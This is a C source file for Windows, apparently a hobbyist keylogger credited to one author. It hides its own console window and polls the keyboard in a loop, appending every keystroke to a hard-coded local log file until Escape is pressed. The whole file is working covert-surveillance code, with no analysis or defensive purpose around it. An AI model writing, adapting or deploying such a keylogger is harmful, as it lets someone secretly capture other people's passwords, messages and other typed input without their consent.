#include <stdio.h>
#include <time.h>
#include <windows.h>

#define PATH "C:\\Users\\asus\\Desktop\\paTH TO LOGGER\\log.txt" // The path to the log file

int main() {
    FILE *file;

    // Time stuff.
    time_t t;
    t = time(NULL);

    // Hide the window
    HWND window;
    AllocConsole();
    window = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(window, 0);

    file = fopen(PATH, "a");
    if (file == NULL) {
        printf("Failed to open log file.\n");
        return 1;
    }

    fprintf(file, "\n#$Logger: Written by Sadeep Acharya. Started logging @ %.*s", (int)strlen(ctime(&t)) - 1, ctime(&t));

    int previousKeyState[256] = { 0 }; // Array to store the previous key states

    while (1) {
        Sleep(20); // To make sure this program doesn't steal all resources.

        for (int i = 8; i <= 255; i++) {
            if (GetAsyncKeyState(i) & 0x8000) {
                if (!previousKeyState[i]) {
                    previousKeyState[i] = 1; // Update the previous key state

                    switch (i) {
                    case VK_SPACE: // Space key...obviously.
                        fprintf(file, " ");
                        break;
                    case VK_TAB: // Tab key.
                        fprintf(file, "[TAB]");
                        break;
                    case VK_RETURN: // Enter key.
                        fprintf(file, "[ENTER]");
                        break;
                    case VK_ESCAPE: // Escape key.
                        fprintf(file, "[ESC]");
                        break;
                    case VK_BACK: // Backspace key.
                        fprintf(file, "[BACKSPACE]");
                        break;
                    default:
                        fprintf(file, "%c", (char)i); // Put any other inputted key into the file.
                    }
                }
            }
            else {
                previousKeyState[i] = 0; // Update the previous key state
            }
        }

        if (GetAsyncKeyState(VK_ESCAPE) & 0x8000) { // The escape key. You can change this to anything you want.
            fclose(file);
            return 0;
        }
    }
}
